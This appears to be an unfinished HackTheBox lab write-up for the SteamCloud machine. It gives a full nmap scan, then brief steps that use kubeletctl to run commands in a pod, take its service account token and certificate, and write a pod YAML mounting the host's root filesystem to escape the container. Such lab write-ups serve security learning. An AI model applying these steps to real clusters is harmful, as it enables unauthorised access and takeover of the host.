# Hackthebox - Steamcloud 

- [Box on HTB](https://app.hackthebox.com/machines/SteamCloud)

## Nmap

```
┌──(root💀kali)-[~]
└─# nmap -T4 -p- -sC -sV -O 10.10.11.133
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-25 20:10 EDT
Stats: 0:06:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 49.70% done; ETC: 20:22 (0:06:05 remaining)
Stats: 0:08:39 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 70.12% done; ETC: 20:22 (0:03:41 remaining)
Stats: 0:09:37 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 78.16% done; ETC: 20:22 (0:02:41 remaining)
Nmap scan report for 10.10.11.133
Host is up (0.038s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
2379/tcp  open  ssl/etcd-client?
| tls-alpn: 
|_  h2
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2022-06-26T00:10:16
|_Not valid after:  2023-06-26T00:10:16
2380/tcp  open  ssl/etcd-server?
| tls-alpn: 
|_  h2
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2022-06-26T00:10:16
|_Not valid after:  2023-06-26T00:10:16
|_ssl-date: TLS randomness does not represent time
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 09d27c55-f3f0-49e7-a4a4-f2963e7f9e17
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 4fbc6edb-9955-4e99-a92d-333b5bf9a1be
|     X-Kubernetes-Pf-Prioritylevel-Uid: d41918d2-c753-4f4b-aa00-c0c038c19e46
|     Date: Sun, 26 Jun 2022 00:23:17 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: eec3b6db-6cb7-447b-8cc6-d8758c34812a
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 4fbc6edb-9955-4e99-a92d-333b5bf9a1be
|     X-Kubernetes-Pf-Prioritylevel-Uid: d41918d2-c753-4f4b-aa00-c0c038c19e46
|     Date: Sun, 26 Jun 2022 00:23:17 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: eea93706-5921-4bac-90a0-4f6141dd5f06
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 4fbc6edb-9955-4e99-a92d-333b5bf9a1be
|     X-Kubernetes-Pf-Prioritylevel-Uid: d41918d2-c753-4f4b-aa00-c0c038c19e46
|     Date: Sun, 26 Jun 2022 00:23:17 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
|_http-title: Site doesn't have a title (application/json).
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2022-06-25T00:10:14
|_Not valid after:  2025-06-25T00:10:14
|_ssl-date: TLS randomness does not represent time
10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=steamcloud@1656202218
| Subject Alternative Name: DNS:steamcloud
| Not valid before: 2022-06-25T23:10:18
|_Not valid after:  2023-06-25T23:10:18
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.92%T=SSL%I=7%D=6/25%Time=62B7A6F5%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,22F,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20eec3b
SF:6db-6cb7-447b-8cc6-d8758c34812a\r\nCache-Control:\x20no-cache,\x20priva
SF:te\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20n
SF:osniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x204fbc6edb-9955-4e99-a92d-33
SF:3b5bf9a1be\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20d41918d2-c753-4f4b-
SF:aa00-c0c038c19e46\r\nDate:\x20Sun,\x2026\x20Jun\x202022\x2000:23:17\x20
SF:GMT\r\nContent-Length:\x20185\r\n\r\n{\"kind\":\"Status\",\"apiVersion\
SF:":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden
SF::\x20User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/
SF:\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(HTTP
SF:Options,233,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20eea93706-592
SF:1-4bac-90a0-4f6141dd5f06\r\nCache-Control:\x20no-cache,\x20private\r\nC
SF:ontent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosniff\
SF:r\nX-Kubernetes-Pf-Flowschema-Uid:\x204fbc6edb-9955-4e99-a92d-333b5bf9a
SF:1be\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20d41918d2-c753-4f4b-aa00-c0
SF:c038c19e46\r\nDate:\x20Sun,\x2026\x20Jun\x202022\x2000:23:17\x20GMT\r\n
SF:Content-Length:\x20189\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\
SF:",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x20Us
SF:er\x20\\\"system:anonymous\\\"\x20cannot\x20options\x20path\x20\\\"/\\\
SF:"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(FourOhF
SF:ourRequest,24A,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x2009d27c55-
SF:f3f0-49e7-a4a4-f2963e7f9e17\r\nCache-Control:\x20no-cache,\x20private\r
SF:\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosni
SF:ff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x204fbc6edb-9955-4e99-a92d-333b5b
SF:f9a1be\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20d41918d2-c753-4f4b-aa00
SF:-c0c038c19e46\r\nDate:\x20Sun,\x2026\x20Jun\x202022\x2000:23:17\x20GMT\
SF:r\nContent-Length:\x20212\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"
SF:v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x2
SF:0User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/nice
SF:\x20ports,/Trinity\.txt\.bak\\\"\",\"reason\":\"Forbidden\",\"details\"
SF::{},\"code\":403}\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=6/25%OT=22%CT=1%CU=36407%PV=Y%DS=2%DC=I%G=Y%TM=62B7A75
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 862.22 seconds
```

## Kubernetes

- Lots of ports that comes out are kubernetes related.
- After a little reading (see the resources) I decided to try [kubeletctl](https://github.com/cyberark/kubeletctl)
- Pods
![image](https://user-images.githubusercontent.com/96747355/175795755-6dff24fb-fdec-4461-bd22-bd300994aa69.png)  
- configz  
![image](https://user-images.githubusercontent.com/96747355/175795770-8085b5f6-d3b5-4380-b40e-788e2f60508c.png)  
- Reading the doc we can actually execute command in a container. Turns out we have an nginx pod so we could try this. After a few tries we can actually find the user flag  
![image](https://user-images.githubusercontent.com/96747355/175795795-1313eae6-504f-4fbd-bf4f-09ca40600dbd.png)  
- We can try to authenticate by getting the cert and the token (see [here](https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration#service-account-tokens) for more details about this)
![image](https://user-images.githubusercontent.com/96747355/175796515-67a6bbdf-02e2-4e40-938b-e563acd08994.png)  
![image](https://user-images.githubusercontent.com/96747355/175796523-7ac7824f-1acb-481e-93c0-c73de46a1843.png)  
- Now let's use this to authenticate  
![image](https://user-images.githubusercontent.com/96747355/175796537-cdb0a471-7f53-428b-aa1c-c3b993d30426.png)  
- It works
- We can now make our own yaml

```yaml
apiVersion: v1 
kind: Pod
metadata:
  name: new-nginx-pod
  namespace: default
spec:
  containers:
  - name: new-nginx-pod
    image: nginx:1.14.2
    volumeMounts: 
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:  
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```
- Now we need to apply our new pod
![image](https://user-images.githubusercontent.com/96747355/175797313-76c0a98c-4e88-4b47-a73e-9f783730a9ad.png)  

**Coming soon**

## Resources

- [Kubernetes pentest methodology part 1](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)
- [Kubernetes pentest methodology part 2](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-2)
- [Kubernetes pentest methodology part 3](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3)
- [Hacktricks - Pentesting Kubernetes](https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/pentesting-kubernetes-from-the-outside)

